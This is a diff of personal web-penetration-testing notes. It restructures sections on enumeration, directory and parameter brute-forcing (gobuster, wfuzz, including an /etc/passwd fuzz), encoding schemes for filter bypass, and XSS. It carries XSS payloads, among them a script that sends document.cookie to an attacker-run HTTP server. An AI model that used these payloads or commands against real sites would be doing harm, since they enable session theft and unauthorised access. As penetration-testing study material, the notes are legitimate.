@@ -6,46 +6,14 @@ Hope you enjoy!
 
 
 ## Enumeration
-Before start I recomend download the SecList wordlist in your kali Linux:
-```
-cd User/share/wordlist
-sudo git clone https://github.com/danielmiessler/SecLists
-```
+Yout should do some soft annalysis brute force to check:
+- robots.txt
 #### Brute Force
-###### Directories brute-force
 ```
 gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -u http://10.10.10.88 -o gobuster/port80root.txt
 
 feroxbuster -u http://10.10.10.88 -x php -B -n
 ```
-**Hack steps**
-1. Make some manual request to discover the most essential
-2. Use de site-map generate manually to launch an automate annalysis for the hidden content
-3. Try apply several domain name if you discover and extensions (for backups as well)
-4. If you discover some new path just repeat recursively
-
-###### Parameters brute-force
-**hack steps**
-1. Use a common list of debug parameter names (debug, test, hide, source, etc...) and common values (true, yes, 1...), for this we can use "Cluster Bomb" at>
-2. Monitor all responses received to identify anomalies
-3. Priorize the function where the developers is more probable that they had implemented debug logic (long, search, file upload or download)
-
-A wordlist we can use to search for parameters could be:
-https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt
-
-```bash
-#brute forcing GET parameters name
-##example form Timing machine (htb)
-wfuzz -u http://$ipv/image.php?FUZZ=/etc/passwd -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt --hw 0
-wfuzz -z list,a-b-c -z list,1-2-3 http://mysite.com/FUZZ/FUZ2Z
-wfuzz -w burp-parameter-names.txt -w tftp.fuzz.txt http://mysite.com/FUZZ/FUZ2Z
-
-#brute forcing POST parameters name
-wfuzz -c -w users.txt --hs "Login name" -d "name=FUZZ&password=FUZZ&autologin=1&enter=Sign+in" http://zipper.htb/zabbix/index.php
-wfuzz -z list,a-b-c -z list,1-2-3 -d "FUZZ=FUZ2Z&autologin=1&enter=Sign+in" http://mysite.com/index.php
-wfuzz -w burp-parameter-names.txt -w tftp.fuzz.txt -d "FUZZ=FUZ2Z&autologin=1&enter=Sign+in" http://mysite.com/index.php
-```
-
 
 #### Spidering
 Tools to spidering:
@@ -54,106 +22,79 @@ Tools to spidering:
 - Zed Attack Proxy (ZAP)
 - CAT
 
-Spidering using puppeteer (nodejs) combinated with tor nodes.
-https://school.geekwall.in/p/mYqy1FSw
-https://www.webscrapingapi.com/web-scraping-with-a-headless-browser-using-puppeteer-and-node-js/
+The problem with this automate tools are: 
+- Sometime some url's are not detecte due to be in a dynamic menu created with javascript.
 
 
-###### User-directed Spidering
-A way to spidering manually where an application is recopilling information related to the sites that the users visit.
-You can use for this:
-- Burp Suite
-- Scaraban
 
-**Spidering Hack-steps**
-1. Configure your browser to proxy with burp suite (foxy proxy), define in this the scope
-2. Visit each url and link you see in the webpage, submit every forms and inputs. Try to browse with and without javascript enabled and same with cookies
-3. Review the site map generate by the burp spider and check in case that there were routes that you didn't discover manually check where were founded and visit this places just in case we could find more information
-4. Optionally, now with a first glance of automatic and manual spidering, add the manual routes to the spidering and launch the automatic spidering again. Remember to exclude the dangerous path!
-
-###### Discovery Hidden Content
-- Debug Information that doesn't have been remove
-- Actions or content dedicated to another kind of users
-- Backup files
-- Logs files
-
-###### Inference form the published content
-Name Scheduling -> Observe wich nomenclature follow for some files (NewPage.jsp or About.php), the minus case or capital letters and try to create a dictionary related with this
-
-**Hack steps**
-1. Check any client-side code (javascript and html) to see if fitlers some sensitive information related to hidden files:
-	- Comments
-	- Forms without submit
-	- If you file AddDocumento.jsp and DeleteDocumento.jsp you should create a custom wordlist for keep searching other actions as edit, move...
-2. Try to discover wich extensions use the server and serach using some standard as  txt, bak, src, inc, and old
-3. Search for temporary files created by developer tools and may have sensitive information.  Examples include the .DS_Store file, which contains a directory index under OS X, file.php~1, which is a temporary file created when file.php is edited, and the .tmp file extension that is used by numerous software tools.
-4. For each new element discover retry the steps here
-
-###### Use of public information
-- SearchEngine (Google, yahoo, bin...)
-- Web archives as WayBack machine
-```text
-site:www.wah-target.com
-site:www.wahh-target.com login
-link:www.wahh-target.com # Include the website and application in the link. This may include links to old content, fucntionalities etc..
-related:www.wahh-target.com #Páginas "similares al la web
+## Encoding Schemes
+- URL Encoding
 ```
-1. Try to search not just in Google web section but in the Groups and News
-2. Browser to the last page of search
-3. Try cached version
-4. Use other domains not just google!
+%3d -> =
+%25 -> %
+%20 -> Space
+%0a -> New line
+%00 -> Null byte
 
-###### Levering the Web Server
-Nikto and Wikto are automatic tools to identifies well-known vulnerabilities.
-
-###### Application pages Vs. Functional Path
-Is important create a map-site of path/functionalities for the website. For that we recolect:
-- Pages that allows action over them
-- Type of request used
-
-and with that on mind just:
-1. Identify instances where you access to functionalities using the name of a function as a parameter (`/admin.jsp?action?editUser`)
-2. Brute force the parameter to try discover other functions accesible but theoretically not accesible
-3. Compile a map of application content based on functional paths enumerating all the enumerated functions and the logical paths and dependencies between them
-
-
-#### Identify Entry Points for User Input
-The key locations to pay attention to:
-- Every URL string up to the query string market
-- Every parameter submitted within the URL query string
-- Every parameter submitted with POST
-- Every cookie
-- Every other HTTP header (*User-Agent, Referer, Accept, Accept-Language and Host*)
-
-###### URL File Paths
-For REST-style URL
-`http://eis/shop/browse/electronics/iPhone3G/`
-We can consider this kind of URL's as entry points to the user due to that the path use the real name of the folders and files.
-
-###### Request Parameters
-Parameters submitted within the URL query string (GET), the message body (POST) and HTTP cookies are the most obvious entry points for user input but is possible find some custom XLM withing parameter data.
-
-If you dissect the format and place with your own payload you may find SQLI or path traversal!
-
-###### HTTP Headers
-Applications logs some content of HTTP header such as _Referer and _User-Agent_. This headers should be consider as entry points.
-
-- _Referer_: Sometime modifying this we can get that the page apply different behaviours and add HTML in respomnse. This could be useful to discover some vulenrabilities.
-- _User-Agent_: Sometimes a same web return different versions depending of the User-Agent received. This can imply differents web vulnerabilities. We should spoof some User-Agent to see the different and even study each one as a different webapp.
-
-For more about the _User-Agent_ as an entry point:
-https://miloserdov.org/?p=5346
+#Characters we should encode in a malicious http request
+space % ? & = ; + #
 ```
-[PENDIENTE DE DESARROLLAR]
-[spoof several User-agents and get if some answer is different!]
+To URL encode we have in Kali linux the `urlencode` command.
+
+- Unicode Encoding
+Main interest to bypass input filters, for example some malicious inputs
+UTF-8 is variable-lenght and can use one or more bytes to define a character
 ```
-Burp Intruder containe a built-in payload list containing a large number of user agents with which you can check the different responses with the different possibilities.
+%u2215 -> /
+%u00e9 -> é
 
-- IP-Address: In addition sometimes the IP Address is used to allow the session for users, geolocation etc... When the server is at back of a load balancer or proxy the IP address is specified in the _X-Forwarded-For_. By adding a suitably crafted _X-Forwarded-For_ you may be able to deliver SQLi or even persistent XSS
+%c2%a9 ->  ©
+%e2%89%a0 -> !=
+```
+Example?
 
-#### Identify Server-side technology
+- HTML encode
+You should have this on mind to test xxs
 
+```
+&quot; — "
+&apos; — '
+&amp; — &
+&lt; — <
+&gt; — >
 
+#In addition, any character can be HTML-encoded using its ASCII code in decimal form:
+&#34; — "
+&#39; — '
+
+#or by using its ASCII code in hexadecimal form (prefixed by an x ):
+&#x22; — "
+&#x27; — '
+```
+- Base64 Encoding
+With Base64 you can encode any binary data and represent with ASCII printable characters. We have to recognize any base64 string to decode and check if tthere is some sensitive information
+```
+echo " text" | base64
+echo "dGV4dAo=" | base64 -d
+```
+- Hex Encoding
+```
+#encode
+echo -n "daf" | od -A n -t x1
+
+#decode
+TESTDATA=$(echo '0x64 0x61 0x66')
+for c in $TESTDATA; do
+    echo $c | xxd -r
+done
+```
+You just should try decode every suspicious information that could be interesting!
+
+- Remoting and serialization Framework
+	We'll speak later about this but the main frameworks are:
+	- Flex and AMF
+	- Silverlight and WCF
+	- Java serialized Object
 
 ## Attack vectors
 The different attacks we're going to deploy here and define a methodology are:
@@ -300,11 +241,8 @@ Other attack vector could be:
 
 If you discover some input where you can add html code you can try inject javascript code with:
 ```
-# basic tests
 <scrip>alert("testing XSS");</script>
 <script>alert(document.cookie)</script>
-%00<script>alert(1)</script>
-<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; #html encode some characters
 
 #### Open an http server in your malicious machine (python3 -m http.server)
 <script>document.write('<img src="http://127.0.0.1:8000/daffi.png?cookie=' + document.cookie + '">')</script>
@@ -339,8 +277,6 @@ script
 onload
 javascript
 ```
-
-
 
 **Using AJAX requests**
 - AJAX Request to obtain a session token
@@ -397,20 +333,6 @@ For this we have to try create an event inside the tag we're in!
 OnFocus="alert('Hola Mundo!');" />
 ```
 
-###### Some more resources from twitter
-```text
-Cross site scripting (XSS)
-#bugbounty
-
-https://hackerone.com/reports/1264834
-(payload :"><img src=x onerror=alert(document.cookie);.jpg)
-
-https://hackerone.com/reports/1601140
-(%3Csvg+on+onload%3D%28alert%29%28document.domain%29%3E)
-
-https://hackerone.com/reports/1367642
-("></script><script>alert(document.cookie)</script>)
-```
 #### CSRF
 Where is the risk for this?
 
@@ -530,80 +452,3 @@ https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web
 
 
 ```
-
-
-
-# Anexo A
-## Encoding Schemes
-- URL Encoding
-```
-%3d -> =
-%25 -> %
-%20 -> Space
-%0a -> New line
-%00 -> Null byte
-
-#Characters we should encode in a malicious http request
-space % ? & = ; + #
-```
-To URL encode we have in Kali linux the `urlencode` command.
-
-- Unicode Encoding
-Main interest to bypass input filters, for example some malicious inputs
-UTF-8 is variable-lenght and can use one or more bytes to define a character
-```
-%u2215 -> /
-%u00e9 -> é
-
-%c2%a9 ->  ©
-%e2%89%a0 -> !=
-```
-Example?
-
-- HTML encode
-You should have this on mind to test xxs
-
-```
-&quot; — "
-&apos; — '
-&amp; — &
-&lt; — <
-&gt; — >
-
-#In addition, any character can be HTML-encoded using its ASCII code in decimal form:
-&#34; — "
-&#39; — '
-
-#or by using its ASCII code in hexadecimal form (prefixed by an x ):
-&#x22; — "
-&#x27; — '
-```
-- Base64 Encoding
-With Base64 you can encode any binary data and represent with ASCII printable characters. We have to recognize any base64 string to decode and check if tthere is some sensitive information
-```
-echo " text" | base64
-echo "dGV4dAo=" | base64 -d
-```
-- Hex Encoding
-```
-#encode
-echo -n "daf" | od -A n -t x1
-
-#decode
-TESTDATA=$(echo '0x64 0x61 0x66')
-for c in $TESTDATA; do
-    echo $c | xxd -r
-done
-```
-You just should try decode every suspicious information that could be interesting!
-
-- Remoting and serialization Framework
-	We'll speak later about this but the main frameworks are:
-	- Flex and AMF
-	- Silverlight and WCF
-	- Java serialized Object
-
-
-
-# References
-[^1] How to use User Agent to attack websites: https://miloserdov.org/?p=5346 
